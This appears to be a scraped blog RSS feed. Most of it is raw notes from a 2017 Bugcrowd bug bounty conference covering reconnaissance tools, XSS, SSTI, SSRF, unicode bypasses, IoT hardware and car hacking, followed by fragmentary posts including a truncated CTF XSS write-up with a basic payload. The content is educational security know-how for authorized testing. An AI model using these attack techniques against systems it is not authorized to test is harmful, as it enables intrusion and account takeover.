	  <description><![CDATA[
	     <p>Today was <a href="https://pages.bugcrowd.com/level-up-virtual-hacking-conference">LevelUp, Bugcrowd&#39;s first Virtual Hacking Conference</a>. With 2 seperate streams over 8 hours, the <a href="https://docs.google.com/spreadsheets/d/1nKnwk3qVtoQlHs32atwwTIWjOHZ9kjnbwpPTJVfvKeo/pubhtml?gid=0&single=true">schedule was jammed packed</a> with interesting talks and knowledge drops across topics including web, mobile, IoT and even car hacking.</p>

<p>Waking up at 1:30am (AEST) to get some Bulletproof coffee in before it started, I think I briefly moved once from the couch in the whole session. The rest was solid and intent focus on the topics, trying to keep up with all of the amazing content, while also taking notes (~1200 lines worth!), and <a href="https://twitter.com/search?l=&q=%23ItTakesACrowd%20from%3A_devalias&src=typd&lang=en">dropping out tweets</a> at the same time. I don&#39;t think i&#39;ve been as engaged or intently focussed on something for such a long period in a long time. Testament to the quality of the conference!</p>

<p>One of the common themes of the conference today (besides all the tech knowledge) was that of community and sharing. This is something that speaks to my core, and one of the things that I love about the security industry. How people can be so open, be willing to share their knowledge, and humbly learn in return. Such a great way to bring everyone up across the board, and super grateful for it.</p>

<p>There are a few places you can get connected with bug bounty hunters / security researchers that I wanted to list here:</p>

<ul>
<li>Twitter!

<ul>
<li>This sort of goes without saying given how active the security community is here. But with regards to this conference and related things, check out Bugcrowd&#39;s hashtag: <a href="https://twitter.com/search?q=%23ItTakesACrowd">#ItTakesACrowd</a></li>
<li>Also make sure to follow <a href="https://twitter.com/Bugcrowd">@Bugcrowd</a>, and if you&#39;d like to see more from me (when I rarely but occasionally tweet) you can find me at <a href="https://twitter.com/_devalias">@_devalias</a> (always feel free to say hi!)</li>
</ul></li>
<li><a href="http://bugbountyworld.com/">Bug Bounty World</a>

<li><a href="https://forum.bugcrowd.com/">Bugcrowd Forum</a>

<ul>
<li>Make sure to also check out the discussions over at the Bugcrowd forum.</li>
</ul></li>
</ul>

<p>In light of that theme, I wanted to share what I have from today, not only so I remember what I saw, but so that everyone else has the opportunity to see some of the great stuff that was presented today. This post will be largely my raw and unedited notes, with any future posts likely to be more structured/refined.</p>

<p>It&#39;s also worth noting that every talk from both streams was recorded, and will be published to YouTube within the next week or so, so keep an eye out for that! I&#39;ll probably update this page when they&#39;re released, and I intend to write some more thorough blog posts based on each session when I have a chance to go back through it all at a slower pace, so keep an eye out for those!</p>

<p>Do you have any awesome resources, comments, or things to add? I&#39;d love for you to share in the comments below!</p>

<h3>How to Hack Web v2 (Jason Haddix)</h3>

<pre>
Head of Trust and Security at Bugcrowd

https://twitter.com/jhaddix
https://securityaegis.com
https://blog.bugcrowd.com/author/jason-haddix

The Bug Hunters Methodology (Def Con 23)
    distilling a lot of learnings over the years
  google it for the video

The Bug Hunters Methodology v2
  XXS, SSTI, SSRF, code/command injection, fuzzing, tooling
  API testing, object deserialisation, XXE in v2.5

Light reading:
  Web Application Hackers Handbook
  OWASP Testing Guide
  Web Hacking 101
  Breaking into information security
  Mastering modern web penetration esting

Discovery
  Enumall (recon-ng, alt-dns wrapper, etc)

Sub scraping
  https://github.com/aboul3la/Sublist3r
    scrapes search engines/etc for mentions of domains
    sources are different from enumall

  anshumanbh/brutesubs
    set of docker images that include multiple tools
      inc enumall and sublister
      along with gobuster and altdns
      run against a domain you want
      need to modify config/docker scripts to add custom bits
      disable bruteforce for enumall
    did a presentation about this topic recently (TODO)

  mandatoryprogrammer/cloudflare_enum
  anshumanbh/censys.py

Subdomain bruteforcing
  Like: subbrute, gobuster, massdns, dns-parallel-prober, blacksheepwall
  gobuster (21m) and massdns (1.5m) are quick
  massdns found more quicker, but more false positives
  could feed massdns stuff into gobuster to reduce?

  blechschmidt/massdns

  all.txt: https://gist.github.com/jhaddix/86A06C5DC309D085/80A018C66354A056
           https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056
    list of all the dns brute lists in one

Acquisitions
  crunchbase
    protected by distil bot protection
    can write a tool to beat that

Port scanning
  nmap is great, but don't try and scan 65536 hosts with the default port list
  massscan
    doesn't provide a default port list
    use nmaps (giant list of ports)
      <blockquote class="twitter-tweet"><p lang="en" dir="ltr">Default nmap port list into masscan. 11min for 65k hosts <a href="https://twitter.com/Jhaddix">@jhaddix</a> <a href="https://twitter.com/hashtag/ItTakesACrowd?src=hash">#ItTakesACrowd</a> <a href="https://t.co/OLq1qz2HI4">pic.twitter.com/OLq1qz2HI4</a></p>&mdash; Glenn / devalias (@_devalias) <a href="https://twitter.com/_devalias/status/886280729327312896">July 15, 2017</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

Visual identification
  https://github.com/ChrisTruncer/EyeWitness
    checks HTTP(S), RDP and a couple of other protocols too
  https://github.com/breenmachine/httpscreenshot
    another tool

Platform identification and CVE searching
  retire.js, wappalyzer, builtwith

  https://vulners.com/
    combine a lot of CVE/etc sources

  https://github.com/vulnersCom/burp-vulners-scanner
    search in scope domains
    find versions/etc
    link to vulns for lower than that version
    get list of CVE's that might be related

Content discovery/directory bruting
  TBHMv1
    wordlists: seclists, raft, digger_wordlists
    patator
    wpscan
    cmsmap
  
  https://github.com/maurosoria/dirsearch

  
   https://github.com/OJ/gobuster
    super fast

  burp content discovery
    in burp pro
    pretty good, but sort of bogs down java

  danielmiessler/RobotsDisallowed

Parameter bruting?
  https://github.com/maK-/parameth
    This tool can be used to brute discover GET and POST parameters

PortSwigger/backslash-powered-scanner
  /resources/params
    good wordlist

XSS
  TBHMv1
    polyglot strings, seclists, flash reversing, common input vectors
  TBHMv2
    blind XSS
      sleepy puppy (python)
      xss hunter (python)
      ground control (ruby, small)
    polyglots
    xss mindmap

  Blind XSS
    input may eventually end up on some backend app and executes somewhere
    use a payload that loads JS
    need a framework to catch it

    XSSHunter
      payload gathers a lot of really useful data

Polyglots
  injection string that executes in multuple contexts
  may bypass multiple filters
  starting to integrate in lots of scanners
  0xS0bky/HackVault
    unleashing an ultimate xss polyglot

Jackmasa's XSS Mindmap
  breaks down attacks based on context
  PoC's
  ideas for all sorts of things
  used to just be in Japanese
  ported recently to english
  huge image file (svg)
    https://github.com/jackmasa
      seems to have a bunch of projects worth looking at
    https://github.com/jackmasa/XSS.png/tree/master

Server Side Template Injection (SSTI)

  engine identification
    wappalyzer, builtwith, vulners scanner
    test fuzzing
    tooling
    tplmap + burp extension
    backslash powered scanner?

  tl;dr: send some template payload and check for result
    {{2*3}}

  epinna/tplmap
    code/server side template injection detection/exploitation

  other SSTI resources
    lots of links

Server Side Request Forgery (SSRF)
  look for any paths/urls referenced
  wilded/psychoPATH
  will release a tool with his Def Con talk in a week
  can bypass filtering blacklists using alternate IP encoding
  SSRF bible: https://www.reddit.com/r/netsec/comments/2tpfz7/ssrf_bible_cheatsheet_by_onsec/
    protocol/schema mappings
    exploit examples
    update coming soon, BlackHat US-17?
  SSRF resources
    many links
    including BishopFox link: burp, collaborate and listen

Code Inject, Command Injection, Future of Fuzzing
  SQLi
    polyglot, seclists, swlmap, params, tooling, resources

  https://github.com/commixproject/commix
    CMDi
      supports PHP code injection
      custo modules
      powershell and python shells

Burp backslash powered scanner
  generic payloads
  multi-tiered
  checks responses
  basically gives you an idea of where it might be useful to look
    supports testers rather than replacing them!

<h3>How to Fail at Bug Bounty (Caleb Kinney)</h3>

<pre>
Twitter: @aphire
Blog: http://bountyhuntersguild.com
GitHub: calebkinney OrOneEqualsOne

Lessons learned during bug bounties

Conferences: rushing to see talks, not networking

Failed to read the bug bounty program brief
  rules of engagement
  scope
  focus areas
  out of scope
  excluded vuln types
  rewards/incentives
  disclosure rules

Failed to show impact
  used to submit every bug, priority often wasn't in thought process
  understand vulnerability prioritisation and explain it to program owners
    P1 - Critical
    P2 - Severe
    P3 - Moderate
    P4 - Low
    P5 - Informational / Won't Fix
  can you combine a self-XSS with CSRF to up the priority?

Failed to understant criticality
  submitting a won't fix will hurt your average vuln score
  utilize the Bugcrowd Vulnerability Rating Taxonomy

Failed to understand the application
  eg. 'vuln' that is a feature of the application
  research the application and ask questions
  cross-reference functions between different platforms (eg mobile/web)

Failed to plan for private programs
  Don't ignore the start time, may make you hit many duplicates
  Schedule time to work on the program as soon as it's published

Failed to plan for blacklisting
  have a way to get a new IP address
  or use a VPN/proxy

Bug Bounty != Penetration Test

Part time hunt tips
  wide scopes
    acquisitions/mergers
  assume automated scanning
  recon, recon, recon
    subdomain bruteforcing, port-scanning, google dorking
    censys.io
    shodan.io
  burp extensions
    reflected parameters
    https://github.com/allfro/BurpKit
      used Webkit to better render responses in burp
      JS
    Co2
  payload lists
    polyglots!
  community
    read, give back, collaborate

Hunting makes me a better tester
  understand whats important
  attuned to emergent security trends
  challenge for more technical exploits
  etc..

Personal mobile recon setup
  iPhone with Blink Shell
    doesn't require jailbreak
  DietPi with MOSH (jump mox)
  Port Fowarding
  personal recon script
    Sublist3r, domain, knock, eyewitness
    wraps a bunch of things and combines
    https://github.com/OrOneEqualsOne/Recon
    next gen will be a webapp to help

<h3>Giving Back to the Community (ZSeano)</h3>

<pre>
https://twitter.com/zseano
http://zseano.com
  tutorials, blog posts, etc
full time bug bounty, ranked #2 on bugcrowd
25 years old

Overview
  Finding first bug, chaining to higher priority
  Recon: what are you missing
  Big bounties for a living, and staying sane

Open URL Redirects
  easy to find
  aboutads.info, run burp whilst opting out
  google dorking
    inurl:refirect inurl:&
  bypasses
    will release a lit of bypasses later
  making them more useful
    chain to account takeover via misconfigured oauth
      check their facebook app
        mobile app logs in via FB with app_token
    make sure to url encode the redirect_url
  Stored XSS + Oauth
    redirect user to stored XSS page, JS executes, grab oauth token and login to users account
  key things people miss
    bypassing filters
      generally use some form of regex
      fuzz as much as possible
      plan to update zseano.com with section on bypasses
    not checking for oauth systems in place
    try vulnerable parameter on as many endpoints as possible
      eg. one param on one program used througout the web application
      burp intruder against all endpoints, etc
    check their mobile app
      sometimes use oauth, FB login
      google logins tend to be more secure
    redirect oauth to stored XSS

In future, want to do more talks on more topics

Recon: go back in time
  waybackmachine
    search for old files like robots.txt
    https://gist.github.com/mhmdiaa
      waybackurls
      waybackrobots
    tool idea
      scraping website from years back for URLs/links/etc
      eg. burp-wayback-spider
  .js files are your friends
    way things work, paths
    discovery of new endpoints
    hardcoded app secrets
    sometimes user information
  built a couple of tool
    Burp
      copy selected URLs
      copy links in selected items
    zScanner
      burp spider to discover endpoints
      copy ites found, import to inputscanner
      visits each url, extracts all input names + ids and links to js files
      outputs to burp intruder format
        mass test XSS/sql/etc
      outputs 3 files, ready for burp intruder
        getoutput.txt
        postoutput.txt
        posthostoutput.txt
    use output from zScanner with JS-Scan
      visit each .js file, extract URLs using regex
      displays results on page
      easier to see whats in files without manually reading
    didn't plan on releasing these until recently

Finding bugs full time
  remain calm, take a step back
  see if someone has found something similar
  don't be afraid to ask people  
  be professional, waiting to be paid can be annoying
  be smart, learn where to spend your time
  test programs before diving in
  look at disclosed reports
  bugcrowd are managed programs
  managed programs on hackerone/synack can be good too
  you don't need an update every week, unless its a P1
  chain bugs to achieve the highest possible impact
    usually leads to bigger payout
  collaborate
  You WILL have bad days. Take time to relax, collect your thoughts, then keep going.
  re-test endpoints, re-visit certain areas of a site
    can either report on the old bug, or open a new report
    depends how much time you put in
  Find a program you love that treats you fair and give it your all
  Sharing is caring! If the program allows for it, share your bugs!  

People need to fuzz more

Store all vulnerable paramets found in a text file

Include your bug bounty name/how to contact/etc in your user agent

Have a few blog posts in the works

<h3>Doing Recon Like a Boss (Ben Sadeghipour)</h3>

<pre>
https://twitter.com/Nahamsec

Agenda
  Overview
  Traditional way (brute forcing)
  AWS
  Abusing Github
  Asset identification

Why
  bigger attack surface
  more bugs
  more bounties
  more problems

Bruteforcing
  tools
    sublist3r, enumall, massdns, altdns, brutesubs, dns-parallel-prober, dnscan, knockpy, tko-subs, HostileSubBruteforce
  find a patterns
    .dev, .corp, .stage
  brute force again
    different permutations/environment

Amazon Web Services
  look for S3 buckets
    site:s3.amazonaws.com + ...
  use google for patterns
  GitHub
  automate your work

Automation
  create a list of subdomains
  create a list of environments
  automate
  catch them all
  new tool: Amazon S3 Bucket finder
    other tools: sandcastle, bucket_finder
    hopefully will release on github sometime next week

AWS Recon, what could go wrong
  S3 bucket not owned by company
  may be out of scope
  S3 bucket without sensitive info
  3rd party apps

Github Recon
  environments (dev, stage, prod)
  secret keys (API_key, AWS_Secret, etc)
  internal credentials
  API endpoints
  Domain patterns
  example
    "foo.com" "dev"
    "dev.foo.com"
    "bar.com" API_key
    "bar.com" password
    "api.bar.com"
    google dork
      site:"github.com" "org"
  tools
    gitrob
    git-all-secrets
    truffleHog
    git-secrets
    repo-supervisor
    do it manually..

Asset identifcation
  censys.io
    look for SSL certificates
    "company" + internal

  shodan.io
    search by hostname
    filter for
      ports 8443, 8080, 8180, etc
      title: "dashboard [jenkins]"
      product:Tomcat
      hostname:corp.levelup.com
      etc
    buy book by shodan creator for $5

  archive.org
    review source
    find old endpoints/functionality
    look for JS files
    exploit them!

  .js files
    endpoints
    credentials/tokens
    subdomains (inc internal)
    new tool being released next week

All tools included in this talk will be on the bugbountyforum website
Personal tools will be released next week

Burp 'should' be able to do JS parsing stuff
  in reality, seems to not work as well as it should
  can be easier to make external tools, do them your own way, etc
  hope someone takes this tool (when released) and create a burp plugin for it
  another tool (might get released)
    crawl website, download all JS files locally

<h3>Hidden in Plain Site: Disclosing Information via Your APIs (Peter Yaworski)</h3>

<pre>
https://twitter.com/yaworsk

Application Security Engineer at Shopify
Wrote Web Hacking 101
  Hopefully Real World Web Hacking via No starch press

Overview
  What we're talking about
  Why we care
  Why it happens
  How you find it
  Examples

What we're talking about
  API's that reveal personal info or app sensitive info
  Focus on API's that render info to page source, parsed by react/angular/etc

Why we care
  Easy
  Impacts range from benign to critical
  Sometimes they can be chained together

Why it happens
  automation of repetitive tasks
  code abstraction
  easy to make mistakes, incur technical debt

Automation
  eg. rails is great at automating repetitive tasks, generate scaffold
  Will generate HTML view, but also .json endpoint for API
  You could remove those from the HTML view, won't see the information
  But can still get the full data from the API endpoint
  May not realise you need to edit the json file as well

Code abstraction
  eg. merging all json fields
  add new secret field
  manually, haven't updated json file, so fine
  but using json merge, the new param will be exposed

How do you find it
  initial recon
    identify software on site
      wappalyzer
        look for rails, angular, react
      eg rails sites follow certain patterns
  watch your proxy history
    look for gian json blobs in page sources
    watch for API calls
  mobile apps

<h3>Targeting for Bug Bounty Research (Matthew Conway)</h3>

<pre>
Lead product security engineer: Heroku, Salesforce

https://twitter.com/mattreduce

Focuses
  Efficient, repeatable discovery
  Judge targets on measurable criteria
  Keep flexible/portable records
  Put it into use

Reconnaissance Stage

When to enumerate
    start first, return to

Why spend time on info gathering?
  don't miss a target/vuln
  better coverage for program owner
  deep understanding yields great findings

Enumeration methods
  Before you find problems, you need to find all the places they live 
  need to cast the net wide

Enumerating hosts
  information sources
    dns
      for info, but also vulns
      eg. subdomain takeovers, exfil data, command&control
    github
      may identify api's/etc
    rapid7 project sonar
      scans the whole public internet, seeing what's vulnerable
    google search
      hosts
      software running
      secret pages
    google certificate transparency report
      can find hosts through subdomains company registered certs for
    beta access
      if a company with bug bounty program has beta program, try it
      test new features
      follow them on twitter, other social media, be aware of what they put out there
    other open sites
      dnsdumpster
      threatcrowd
      thratminer
      https everywhere atlas
      look for opportunities to repurpose tools online

  techniques
    google queries
      site:foo.com
      find results from subdomains not on list yet
    brute forcing
      try common subdomains
      bonus points for expanding with own wordlist from crawling own targets
    own scripts
      automate this + anything else you can
    dns tools
      dig, host
      dnsrecon
      dnsenum
      dnsmap
    recon-ng
      more framework than a script, like metasploit for recon
    altdns (shubs)
      read shubs blog: high frequency bug hunting
    https://github.com/jhaddix/domain
      Setup script for Regon-ng/altdns

Recording results
  CSV file, SQL database
  get creative
  choose what to catalog
    domain
    type
    think about what you'd like to know when choosing the next target you want to work on
  Find, Fix, Finish, Exploit, Analyze (F3EA) cycle
  https://github.com/infosec-au/assetnote-poc
    push notifications for passive DNS data
  cleaning up data
    write some scripts to run against hosts
    screenshots
   validating possible targets
    SSL certificates used by that host
    common cookie names across hosts
    distinctive HTTP headers, fragments, etc
    logo images
    copyright lines
    privacy policy links
    contact information
    google analytics tracking codes

Using target data
  understanding ownership
    some sites give subdomains out to customers
    just because it's on a subdomain of that company, may not be an app they control
      eg company.github.io
    subdomains that point to external services
      eg. blog.company.com
    find out who owns the host before you hack it
  consider scope
    may be explicitly in/out of scope
    sometimes may be implicitly in scope based on rules of engagement
  what now
    enumerate services
    look for vulnerabilities

Summary
  find out everything you can, keep good notes
  Respect program scope, remember pitfalls
  Automate as much as you can

<h3>How does unicode affect our Security? (Christopher Bleckmann-Dreher, @schniggie)</h3>

<pre>
https://twitter.com/schniggie?lang=en
Pentester, german car manufacturer
Retired bughunter

ASCII
  7-bit, 128 characters

ISO-8859-?
  ASCII compatible
  8-bit, 256 characters
  Multiple standards

Unicode
  multibyte character set
  fully ASCII/ISO-8859 compatible
  Different encodings (UTF-8, UTF-16, UTF-32, UTF-EBCDIC, ..)
  more like a database, links between copoint to character + some attributes
  Basic Multilingual Plan 65k chars
  Astral plans 1mil+ characters

Unicode Encodings
  different encodings use different bytes to store characters

Security implications - Length
  Length of UTF-8 string vs size of the string
  When allocating memory, etc

Security implications - JavaScript compare
  comparing 2 strings that look the same to the eye
  'ma\xF1ana' == 'man\u0303ana' -> false
  length of strings differ

Security implications - JavaScript regex
  /foo.bar/.test('fooPOOEMOJIbar')
  regex . should match 1 character
  \s\S matches whitespace, not whole of astral symbols
  multi-byte emoji
  current JS in most browsers is ECMScript5
    had trouble with chars in astral planes
    not completely supported by default
    some workarounds for it
  http://scriptular.com
    regex javascript application
    can test it

Security implications - MySQL vs UTF-8
  create table, charset set to utf8
  update table fooPOObar
    shows a warning, incorrect string value
  selecting back the entry, column name is only the prefix before poo emoji
  solution: set database to utf8mb4

Security implications - Internationalised Domain Names
  Stored as ascii strings using punycode
  eg. email spoofing using special characters
  UTF8 symbols that look identical
  Use punycode converter
  Register the converted domain
  real world attack scenarios
    an attack released earlier this year to spoof apple.com/etc
    not meant to be able to mix character sets in domain registrations
      google registrar seemed to allow it
    browsers realised that displaying UTF8 in the domain is bad
      now show the punycode instead

Unicode character - Right to left overide
  can rename the file using ruby File.rename \xe2\x80
  able to rename exe file to a file that looks like it has the extension .ppt
  old attack, known since Windows 98 or so, still works today..

Crashing every iOS and OSX device
  2013, vulnerable to an arabic string
  https://arstechnica.com/apple/2013/08/rendering-bug-crashes-os-x-and-ios-apps-with-string-of-arabic-characters/

Backend != Backend
  Frontend may allow UTF8
  Backend may not be expecting it
  exception from backend

Spotify account hijacking
  Allowed unicode usernames
  Register an account with a superscript word of an existing account user
  Trigger forget password function
  Password reset canonical'ises the username
  Sent him the password reset link
  Using that, used the canonicalised name again
  Was the victim user
  Reset password on that user

Phabricator bypass
  Facebook, like github
  Error, email at that domain not allowed
  MySQL
  add foo@attacker.comPOO@fb.com
  POO is the new %00  

Summary
  for developer
    verify methods, functions, frameworks handle unicode
    input validation should handle unicode
    verify all system and interconnection can handle unicode

POO is the new %00

  Run attify, pentesting IoT devices
  Author: "Learning Pentesting for Andorid Devices"
  Book: IoT hackers handbook, this month
  IoT pentesting guide to be released after this talk

Why
  if not, missing great stuff
  best to do in 2017
  easy targets
  higher barrier of entry
  enormous growth soon
  be prepared
  Examples
    IoT fridge that sends spam email
    Smart home compromised
    Hardcoded password in a medical device
    Shodan for scada things
    Controlling mining trucks

What
  what to look for during IoT big bounties

  When you look at a device
    figure out possible attack vectors
    look closely
    pentesting mindset
      components
      entrypoints
      communication
      protocols
      exposed ports

  Once you have a target
    compromise the whole target
    don't just look at one small part, whole thing
      micro and macro
    where would be most vulnerable?
      start there

How
  how to find vulns that companies will pay for
  "Hacking IoT is not a 'black magic' It can be learnt. Too less resources."

  How to start IoT bug bounty hunting
    attack surface mapping
    hacking the embedded device
    hacking firmware
      may not be available, but can dump from device
    hacking mobile/web/cloud components
    hacking radio communications

      entrypoints
      commuications
      additional web endpoints
      protocol/standard
      specifications

      Creating an architecture diagram

      Looking at a device
        FCC ID mentioned on the back of the device
          required for any radio communication device sold in US
        https://fccid.io/
          eg. EW780-8913-00
            https://fccid.io/EW780-8913-00
          gives you frequencies, internal/external pictures, etc
          can look for JTAG/etc ports

    What next?
      perform exploits
      be systematic
      often one component leads to another
      device -> dump firmware

    How to approach
      embedded -> firmware/web/mobile -> communication

    Hack the embedded device
      open device
      physical tamper protections, special screws, etc
        get a good screwdriver kit
      look at chipsets
        USB microscope
        phone flashlight
      identify things, label them
      dig deep
        look for exposed ports

    UART are easy to find/export
        multimeter to test Tx, Rx, GND
        connect to attify badg or USB-TTL
        identify baudrate
        run minicom for shell access
      screen can be used to connect to a TTY
        sudo screen /dev/ttyUSB0 ..

    JTAG
      can be harder than UART
      can be scattered across board
      JTAGulator or arduino nano flashed with JTAGEnum
      easily identify pinouts for JTAG
      <blockquote class="twitter-tweet"><p lang="en" dir="ltr">Hacking Embedded Devices - Debug JTAG <a href="https://twitter.com/adi1391">@adi1391</a> <a href="https://twitter.com/hashtag/ItTakesACrowd?src=hash">#ItTakesACrowd</a> <a href="https://twitter.com/Bugcrowd">@Bugcrowd</a> <a href="https://t.co/0OPpTAWQjv">pic.twitter.com/0OPpTAWQjv</a></p>&mdash; Glenn / devalias (@_devalias) <a href="https://twitter.com/_devalias/status/886344370944786432">July 15, 2017</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
        Hacking Embedded Devices - Debug JTAG

    Dump Flash
      look for flash chips
      read compoent sheet/datasheet
      may need to solder to adapter, pins are tiny
      then can dump flash

    NAND glitching
      generate fault scenario, have it behave in unexpected way
      drops to bootloader shell
      can set bootloader flags, eg single user mode

    Other attacks too

Firmware Hacking
  Easy to find basic vulns
  Good at RE -> lots of stuff to find
  Learn ARM and MIPS RE
  Sensitive hardcoded values, API keys, encryption mechanisms, etc

Firmware methodology
  binwalk
    extracts filesystem
  firmwalker
    identifies interesting things to look at
  Firmware-Mod-Kit
    allows filesystem modifications, then flash back to device
  Detect if device allows firmware modifications, security checks, etc

Encryption?
  XOR with empty space will give you the key itself

Hardcoded sensitive values
  eg. creds to ftp update server, etc
  Can find all sorts of things
    api keys, backdoors, SSL certs, staging URLs, etc
  Quick binary analysis in IDA
    can see harcoded creds
    command injection vulns
    ROP
    etc

Analysing mobile apps
  native libraries can store secrets
    file, readelf
    IDA demo version can dissass ARM binaries
    look at functions, eg. encryption
  understand the app code

Hacking communication
  look at mobile app -> device communication
  MQTT? CoAP?
  view resources unauthed?
  publish messages/subscribe topics?

  MQTT
    works on pub/sub topic
    might be able to subscribe to *

Hacking radio
  radio analysis/exploitation needs special hardware
  depends on protocol
  BLE/ZigBee most common

  Hacking Zigbee
    attify killerbee
      zbstumbler
      zbdump
      zbreplay
      etc

  Hacking BLE
    ubertooth, BLE sniffer
    sniff traggic
    see what handles being written
    rewrite handles using gatttool

Pentest methodology
  focus on 'attacker simulated exploitation' rather than pentest
  look at macro and micro
  95% success rate, critical vulns, devices compromised
  follow the guide

<h3>Intro to Car Hacking (Alan Mond)</h3>

<pre>
https://twitter.com/mondalan?lang=en
https://twitter.com/carloopio?lang=en
  Car hacking tool

Car Hacking 101
  How to get started
  vehicle networking basics
  demo
  build your own testing buck

What are the different attack surfaces?
  Tire pressure monitoring sensor
    sensor in each tire, connects to car, measures pressure
    communicates via low frequency radio signal
    can intercept that signal
  Bluetooth/wifi
    hotspot may be open
  ODBII port
    underneath steering wheel
    main entry point for access, but already inside car
  Infotainment system
    USB, root access possible, etc

How to get started
  Book: The Car Hacker's Handbook, Craig Smith
  Free download http://ebook-dl.com/book/5277
  Tools, protocols, references

What you'll need
  access to the OBD-II port
    mandated to be on 'CAN' since 2008
  CAN hardware tool
    USB2CAN
    microcontroller with CAN controller on it
  OBD-II to serial (RS-232) cable
  linux machine
    rasberry pi, virtual machine on osx
  OR
    Carloop basic ($55)
    open source
    wireless
  why not cheap ODB2 dongles from amazon?
    could.. just a lot of work to use them
    integrated circuit, converts raw CAN messages to values
    not getting raw messages

Most comprehensive list

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

Vehicle networking basics
  CAN bus
    connects all modules through 2 wires
    dashboard, engine, control modules, infotainment system
    Controller Area Network (CAN)
    2 wires, high and low
    more than 1 CAN bus on vehicle

  Why focus on CAN?
    mandated since 2008
    well supported in linux
    more than just diagnostics..
    currently not encrypted at all..
    signals go from high to low

  Anatomy of a CAN message
    arbitration ID
    IDE: 0 (always for CAN)
    Data length: 1 byte
    Data: payload
    ID and data most important

Demo
  intall can-utils
  provision CarLoop with can-utils, flash over the air
    https://www.carloop.io/apps/app-scoketcan
  cansniffer
  identify by ID, see what changes in the data
    see what changes when you do something on the car
    no documentation out there
    manufacturers don't want you seeing it
    straightforward when you start to see it happen though

Build your own testing buck
  can build a test bench for less than $100
  Power supply
  engine control module
  CAN device
  adding more modules, can get more interesting data
  car-part.com

tools and resources on
  http://illmatics.com/carhacking.html
  https://community.rapid7.com/community/transpo-security/blog/2017/07/11/building-a-car-hacking-development-workbench-part-1

How to access proprietary parameter ID's?
  harder to decode
  query/response structure
  specific to ODB-II
  need to send specific PID to get it back
  most people use a scan tool for that brand, use a y-splitter
  then can capture the request/response

Replay of keyfobs from HackRF/similar devices?
  don't know much about it

Difference between tools mentioned and those dropped with jeep hacking research?
  that paper is a really good read
  goes through process of decoding each CAN message
  has some PID's you can look at (for same brand of car)
  each manufacturer has different 'data dictionaries' for these PIDS
  all tools very similar, can bus/receiver
  simple toolchain

	  <description><![CDATA[
	     <p>I tend to stumble across a lot of interesting things as I travel across the web, and one of my productivity methods is to save the things I don&#39;t have time to check out immediately to <a href="https://todoist.com/">Todoist</a>. Unfortunately, time can be short, and life busy, so those &#39;thats an interesting article&#39;, &#39;i could use that tech thing&#39; and &#39;that would be cool to blog about&#39; things tend to just build up, and clutter my todo lists in an ever less efficient manner. So today lets clear some of that out!</p>

<p>This post will be a vaguely categorised link dump, and depending on if I remember why I saved it, maybe some notes too.</p>

<p>Looking over everything, there seem to be trends around development, security, privacy, blog/website, docker, tech, automation, branding and general performance/efficiency. Not really surprising when I think about the things that tend to interest me :)</p>

<p>Hope you find something interesting!</p>

	  <title>iTerm2 + tmux = <3</title>
	  <link>/pages/alias1/devalias.net/devalias/2017/03/18/iterm-tmux-love/</link>
	  <author>devalias</author>
	  <pubDate>2017-03-18T00:00:00+11:00</pubDate>

	  <description><![CDATA[
	     <p>Just a quick note today, highlighting a super simple but amazingly useful combination I&#39;ve only recently become aware of: <a href="https://www.iterm2.com/">iTerm2</a> + <a href="https://tmux.github.io/">tmux</a>.</p>

<p>If you don&#39;t know what these are:</p>

<ul>
<li>iTerm2 is a terminal emulator for macOS</li>
<li>tmux is terminal multiplexer, allowing you to run multiple programs in the same terminal session</li>
</ul>

<p>If you use SSH a lot, you know the benefits of using something like tmux (or <a href="https://www.gnu.org/software/screen/manual/screen.html">screen</a> for you older folks..) to run multiple programs at once, or keep them running when you disconnect.</p>

<p>While this is definitely a nice feature, I&#39;ve always found the command syntax and interface to be just a little too confusing (growing up in a GUI world..), and so I tend to end up resorting to opening multiple SSH connections or similar hacks. That way I can use the multiple tabs/windows I get from iTerm2 instead.</p>

<p>Hacks no more! Thanks to the little known <a href="https://gitlab.com/gnachman/iterm2/wikis/TmuxIntegration">iTerm2 tmux integration</a>, we can get the benefits of tmux, and the ease of iTerm&#39;s tabs and windows. It works seamlessly. When using iTerm2:</p>

<p>You can create a new tmux session with:</p>
<div class="highlight"><pre><code class="language-" data-lang="">tmux -CC
</code></pre></div>
<p>Or reattach to a previous session with:</p>
<div class="highlight"><pre><code class="language-" data-lang="">tmux -CC attach
</code></pre></div>
<p>This will open a new window running the tmux session. From there, we can open new tabs (<code>command-t</code>), or split the tab vertically (<code>command-shift-d</code>) or horizontally (<code>command-d</code>)</p>

<p>For a more information, you could checkout <a href="http://www.starkandwayne.com/blog/iterm-and-tmux-sitting-in-a-tree/">iTerm and Tmux, sitting in a tree</a> by Jamie van Dyke.</p>

	     <p>Even though you pay for these boxes (US$99/quarter), it becomes another one of those background things you forget about, and then suddenly in the mail arrives this package of biohacking goodies!

	  <title>CTF Snippets: XSS.gif</title>
	  <link>/pages/alias1/devalias.net/devalias/2016/09/16/ctf-snippets-xss-gif/</link>
	  <author>devalias</author>
	  <pubDate>2016-09-16T00:00:00+10:00</pubDate>
	  <guid>/pages/alias1/devalias.net/devalias/2016/09/16/ctf-snippets-xss-gif/</guid>
	  <description><![CDATA[
	     <p>I was playing around with the top challenge on the CTF at <a href="http://www.sectalks.org/canberra/">SecTalks</a> the other night, and thought I&#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</p>

<h2>Hack the gibso.. Website</h2>

<p>To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the <code>administrator</code> was online.. interesting.</p>

<p>Poking around at things, I discovered that the messaging system didn&#39;t seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div>
<p>I checked the message.. but for some reason it didn&#39;t pop, even though my payload seemed fine in the source. :(</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"well"</span><span class="nt">&gt;</span>
